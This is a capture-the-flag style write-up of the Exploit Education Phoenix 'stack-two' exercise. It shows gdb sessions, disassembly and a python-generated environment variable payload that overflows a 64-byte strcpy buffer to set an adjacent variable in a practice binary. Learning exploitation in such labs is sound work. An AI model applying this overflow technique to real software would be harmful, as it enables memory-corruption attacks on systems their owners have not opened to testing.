# stack-two

In the previous excercise, we learned that the function `strcpy` is vulnerable to buffer overflows. This time, we cannot give input directly to the program. The `src` parameter is now given the  char pointer `ptr`. The man page for `getenv` tells us: 

> The getenv() function searches the environment list to find the environment variable name, and returns a pointer to the corresponding value string.

If there exists an environment variable named "ExploitEducation", `ptr` will point to the first address of the array of chars that hold the value of the environment variable. We can therefore control the "input"/src to strcpy just like in the previous excercise by just setting the environment variable to whatever we want.

The buffer is still 64 bytes, so let is begin by setting the environment variable as follows before launching gdb:

```console
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print("A"*64 + "BCDE")')
```

(gbd inherits environment variables from the terminal, and stack-two inherts environment variables from gdb.)

In gdb, we set a breakpoint at the beginning of main and run the program. Environment variables are stored at the very beginning of the stack, so let us print a few strings from there. The command `info proc mappings` shows us where the stack is located in virtual memory. See the output below. The stack grows downwards from `0x7ffffffff000`, even though the column says "End Addr".

```console
gef➤  break main
Breakpoint 1 at 0x4006b1
gef➤  r
Starting program: /opt/phoenix/amd64/stack-two

Breakpoint 1, 0x00000000004006b1 in main ()
gef➤  info proc mappings
process 412
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /opt/phoenix/amd64/stack-two
            0x600000           0x601000     0x1000        0x0 /opt/phoenix/amd64/stack-two
      0x7ffff7d6b000     0x7ffff7dfb000    0x90000        0x0 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 [vvar]
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vdso]
      0x7ffff7ffa000     0x7ffff7ffb000     0x1000    0x8f000 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ffb000     0x7ffff7ffc000     0x1000    0x90000 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ffc000     0x7ffff7fff000     0x3000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

The output below shows a few strings from the beginning of the stack. 

```console
gef➤  x/-50s 0x7ffffffff000
...output omitted...
0x7fffffffee02: "USER=user"
0x7fffffffee0c: "PWD=/opt/phoenix/amd64"
0x7fffffffee23: "LINES=33"
0x7fffffffee2c: "HOME=/home/user"
0x7fffffffee3c: "LC_CTYPE=C.UTF-8"
0x7fffffffee98: "SSH_TTY=/dev/pts/0"
0x7fffffffeeab: "COLUMNS=165"
0x7fffffffeeb7: "MAIL=/var/mail/user"
0x7fffffffeecb: "SHELL=/bin/bash"
0x7fffffffeedb: "TERM=screen"
0x7fffffffeee7: "SHLVL=1"
0x7fffffffef08: "ExploitEducation=", 'A' <repeats 64 times>, "BCDE"
0x7fffffffef5e: "LOGNAME=user"
0x7fffffffef6b: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-two"
0x7fffffffeff8: ""
0x7fffffffeff9: ""
0x7fffffffeffa: ""
0x7fffffffeffb: ""
0x7fffffffeffc: ""
0x7fffffffeffd: ""
0x7fffffffeffe: ""
0x7fffffffefff: ""
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
```

_(I have removed a few uninteresting environment variables from the output above to make it more compact.)_ 

Let us disasseble main and set a breakpoint after the getenv function. When getenv returns, the return value is placed in rax. And we can see below that the content of rax is put onto the stack at rbp-0x8. This must be the ptr pointer. A pointer is 64 bits in x64, so we examine the doubleword at rbp-0x8. Comparing the value with the beginning of the stack where the environment variables are stored, we see that ptr points to the first byte after the equal sign in the environment variable "ExploitEducation". This was not all that surprising of course.

```console
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004006ad <+0>:     push   rbp
   0x00000000004006ae <+1>:     mov    rbp,rsp
=> 0x00000000004006b1 <+4>:     sub    rsp,0x60
   0x00000000004006b5 <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x00000000004006b8 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004006bc <+15>:    mov    edi,0x400790
   0x00000000004006c1 <+20>:    call   0x400500 <puts@plt>
   0x00000000004006c6 <+25>:    mov    edi,0x4007da
   0x00000000004006cb <+30>:    call   0x4004f0 <getenv@plt>
   0x00000000004006d0 <+35>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006d4 <+39>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004006d9 <+44>:    jne    0x4006ef <main+66>
   0x00000000004006db <+46>:    mov    esi,0x4007f0
   0x00000000004006e0 <+51>:    mov    edi,0x1
   0x00000000004006e5 <+56>:    mov    eax,0x0
   0x00000000004006ea <+61>:    call   0x400510 <errx@plt>
   0x00000000004006ef <+66>:    mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006f6 <+73>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004006fa <+77>:    lea    rax,[rbp-0x50]
   0x00000000004006fe <+81>:    mov    rsi,rdx
   0x0000000000400701 <+84>:    mov    rdi,rax
   0x0000000000400704 <+87>:    call   0x4004d0 <strcpy@plt>
   0x0000000000400709 <+92>:    mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070c <+95>:    cmp    eax,0xd0a090a
   0x0000000000400711 <+100>:   jne    0x40071f <main+114>
   0x0000000000400713 <+102>:   mov    edi,0x400828
   0x0000000000400718 <+107>:   call   0x400500 <puts@plt>
   0x000000000040071d <+112>:   jmp    0x400733 <main+134>
   0x000000000040071f <+114>:   mov    eax,DWORD PTR [rbp-0x10]
   0x0000000000400722 <+117>:   mov    esi,eax
   0x0000000000400724 <+119>:   mov    edi,0x400870
   0x0000000000400729 <+124>:   mov    eax,0x0
   0x000000000040072e <+129>:   call   0x4004e0 <printf@plt>
   0x0000000000400733 <+134>:   mov    edi,0x0
   0x0000000000400738 <+139>:   call   0x400520 <exit@plt>
End of assembler dump.
gef➤  break *0x4006d4
Breakpoint 2 at 0x4006d4
gef➤  c
gef➤  x/1xg $rbp-0x8
0x7fffffffe4b8: 0x00007fffffffef19
```

```console
gef➤  break *0x400709  
Breakpoint 3 at 0x400709
gef➤  c
Continuing.
```

From just looking at the assembly code, we can easily see that the buffer starts at rbp-0x50 and that the changeme variable is just above it. However, we could also simply print a bunch of bytes from the stack (starting from the stack pointer), and then just look for our easily recognizable string of A's. As seen below

```console
gef➤  x/100bx $rsp
0x7fffffffe460: 0x18    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe468: 0x00    0x00    0x00    0x00    0x01    0x00    0x00    0x00
0x7fffffffe470: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe478: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe480: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe488: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe490: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe498: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4a0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4a8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4b0: 0x42    0x43    0x44    0x45    0x00    0x00    0x00    0x00
0x7fffffffe4b8: 0x19    0xef    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe4c0: 0x01    0x00    0x00    0x00
```

All we have to do is to make sure the 4 bytes after the buffer get get such that when the integer is loaded into a register it reads 0x0d0a090a. Since the system is little endian, 0x0a must be placed at the lowest address.

```console
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print("A"*64 + "\x0a\x09\x0a\x0d")')
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
``` 

